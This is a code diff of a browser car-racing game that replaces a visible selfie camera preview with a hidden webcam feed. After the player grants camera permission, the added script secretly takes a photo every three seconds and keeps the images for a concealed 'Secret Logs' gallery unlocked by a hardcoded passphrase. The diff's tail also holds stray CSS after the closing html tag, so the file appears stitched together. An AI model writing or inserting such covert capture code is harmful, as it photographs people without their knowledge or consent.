@@ -2,31 +2,185 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pro Driver: Selfie Edition</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Pro Driver: Secret Edition</title>
     <style>
-        body { margin: 0; background: #1a1a1a; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        * { box-sizing: border-box; touch-action: none; }
+        body { margin: 0; background: #111; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; overflow: hidden; }
         
-        #score { color: #f1c40f; font-size: 28px; font-weight: bold; margin-bottom: 5px; text-shadow: 2px 2px #000; }
+        #score { font-size: 24px; color: #f1c40f; margin-bottom: 5px; }
         
-        /* Camera Feed */
-        #cameraContainer {
-            position: absolute; top: 10px; right: 10px; width: 100px; height: 100px;
-            border: 2px solid #f1c40f; border-radius: 10px; overflow: hidden; z-index: 50; background: #000;
-        }
-        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
-
         #gameArea {
-            position: relative; width: 350px; height: 65vh; background: #333;
-            border-left: 4px solid #fff; border-right: 4px solid #fff; overflow: hidden;
+            position: relative; width: 340px; height: 65vh;
+            background: #222; border: 4px solid #444; overflow: hidden;
         }
 
-        .line { position: absolute; width: 8px; height: 80px; background: rgba(255,255,255,0.5); left: 50%; transform: translateX(-50%); }
+        /* The Live Camera (Hidden from view but active) */
+        #camContainer { position: absolute; width: 1px; height: 1px; opacity: 0; overflow: hidden; }
 
-        .car { position: absolute; width: 50px; height: 85px; border-radius: 8px; box-shadow: 0 8px 15px rgba(0,0,0,0.4); }
-        .car::before { content: ""; position: absolute; top: 15px; left: 5px; width: 40px; height: 25px; background: #2c3e50; border-radius: 4px; }
-        .car::after { content: ""; position: absolute; top: 2px; left: 5px; width: 10px; height: 5px; background: #fff; box-shadow: 30px 0 0 #fff; }
+        .line { position: absolute; width: 8px; height: 60px; background: rgba(255,255,255,0.2); left: 50%; transform: translateX(-50%); }
+
+        /* Car Styling */
+        .car { position: absolute; width: 45px; height: 75px; border-radius: 8px; z-index: 5; }
+        .player { background: linear-gradient(#ff4d4d, #990000); border: 2px solid #fff; }
+        .enemy { background: linear-gradient(#2ecc71, #1b5e20); border: 2px solid #000; }
+
+        /* Secret Settings Icon (The Screw) */
+        #secretBtn {
+            position: fixed; bottom: 10px; right: 10px; font-size: 24px; 
+            cursor: pointer; opacity: 0.3; z-index: 1000;
+        }
+
+        /* Controls */
+        .controls { display: flex; gap: 40px; margin-top: 20px; }
+        .btn { width: 70px; height: 70px; background: #333; border: none; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 5px 0 #000; }
+        .arrow { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; }
+        .l-arr { border-right: 20px solid white; }
+        .r-arr { border-left: 20px solid white; }
+
+        /* Secret Gallery Modal */
+        #secretGallery {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
+            display: none; flex-direction: column; align-items: center; padding: 20px; z-index: 2000;
+        }
+        .gallery-grid { display: flex; flex-wrap: wrap; gap: 10px; justify-content: center; overflow-y: auto; }
+        .snap { width: 100px; height: 100px; border: 2px solid #f1c40f; border-radius: 5px; }
+
+        #overlay {
+            position: absolute; inset: 0; background: rgba(0,0,0,0.9);
+            display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 100;
+        }
+        .start-btn { padding: 15px 40px; font-size: 20px; background: #f1c40f; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div id="score">Score: 0</div>
+    
+    <div id="gameArea">
+        <div id="camContainer"><video id="video" autoplay playsinline muted></video></div>
+        <div id="overlay">
+            <h1>PRO DRIVER</h1>
+            <button class="start-btn" onclick="initGame()">START GAME</button>
+        </div>
+    </div>
+
+    <div class="controls">
+        <button class="btn" id="l"><div class="arrow l-arr"></div></button>
+        <button class="btn" id="r"><div class="arrow r-arr"></div></button>
+    </div>
+
+    <div id="secretBtn" onclick="openSecret()">⚙️</div>
+
+    <div id="secretGallery">
+        <h2>Secret Logs</h2>
+        <div class="gallery-grid" id="grid"></div>
+        <button onclick="closeSecret()" style="margin-top:20px; padding:10px;">Close</button>
+    </div>
+
+    <canvas id="hiddenCanvas" width="320" height="240" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('hiddenCanvas');
+        const grid = document.getElementById('grid');
+        const secretGallery = document.getElementById('secretGallery');
         
+        let gameActive = false;
+        let capturedPhotos = []; // Secretly stored here
+        let player = { x: 145, y: 380, score: 0, speed: 5, moveL: false, moveR: false };
+
+        async function initGame() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+            } catch (e) { alert("Camera Permission Required!"); return; }
+
+            document.getElementById('overlay').style.display = 'none';
+            gameActive = true;
+            setupGame();
+            setInterval(takeSecretPhoto, 3000); // Take photo every 3 seconds
+            requestAnimationFrame(update);
+        }
+
+        function takeSecretPhoto() {
+            if (!gameActive) return;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, 320, 240);
+            capturedPhotos.push(canvas.toDataURL('image/jpeg', 0.5));
+        }
+
+        function openSecret() {
+            const code = prompt("Enter Secret Code:");
+            if (code === "vamsi jacks") {
+                grid.innerHTML = "";
+                capturedPhotos.forEach(src => {
+                    const img = document.createElement('img');
+                    img.src = src;
+                    img.className = 'snap';
+                    grid.appendChild(img);
+                });
+                secretGallery.style.display = 'flex';
+            }
+        }
+
+        function closeSecret() { secretGallery.style.display = 'none'; }
+
+        // --- Game Logic ---
+        function setupGame() {
+            gameArea.querySelectorAll('.car, .line').forEach(e => e.remove());
+            for(let i=0; i<5; i++) {
+                let l = document.createElement('div'); l.className = 'line'; l.y = i*150;
+                l.style.top = l.y+'px'; gameArea.appendChild(l);
+            }
+            let p = document.createElement('div'); p.id = 'player'; p.className = 'car player';
+            gameArea.appendChild(p);
+            for(let i=0; i<3; i++) spawnEnemy();
+        }
+
+        function spawnEnemy() {
+            let e = document.createElement('div'); e.className = 'car enemy';
+            e.y = Math.random() * -600; e.style.left = Math.random() * 290 + 'px';
+            gameArea.appendChild(e);
+        }
+
+        document.getElementById('l').onpointerdown = () => player.moveL = true;
+        document.getElementById('l').onpointerup = () => player.moveL = false;
+        document.getElementById('r').onpointerdown = () => player.moveR = true;
+        document.getElementById('r').onpointerup = () => player.moveR = false;
+
+        function update() {
+            if (!gameActive) return;
+            const p = document.getElementById('player');
+
+            document.querySelectorAll('.line').forEach(l => {
+                l.y += player.speed; if(l.y > 600) l.y = -100;
+                l.style.top = l.y + 'px';
+            });
+
+            document.querySelectorAll('.enemy').forEach(e => {
+                e.y += player.speed;
+                if(e.y > 600) { e.y = -200; e.style.left = Math.random()*290+'px'; player.score++; }
+                e.style.top = e.y + 'px';
+                
+                let r1 = p.getBoundingClientRect(); let r2 = e.getBoundingClientRect();
+                if (!(r1.right < r2.left || r1.left > r2.right || r1.bottom < r2.top || r1.top > r2.bottom)) {
+                    gameActive = false;
+                    document.getElementById('overlay').style.display = 'flex';
+                    document.querySelector('h1').innerText = "Crashed! Score: " + player.score;
+                }
+            });
+
+            if (player.moveL && player.x > 0) player.x -= 5;
+            if (player.moveR && player.x < 290) player.x += 5;
+            p.style.left = player.x + 'px'; p.style.top = player.y + 'px';
+            document.getElementById('score').innerText = "Score: " + player.score;
+            requestAnimationFrame(update);
+        }
+    </script>
+</body>
+</html>
+
         #playerCar { background: linear-gradient(180deg, #e74c3c 0%, #c0392b 100%); }
         .enemy { background: linear-gradient(180deg, #2ecc71 0%, #27ae60 100%); }
 
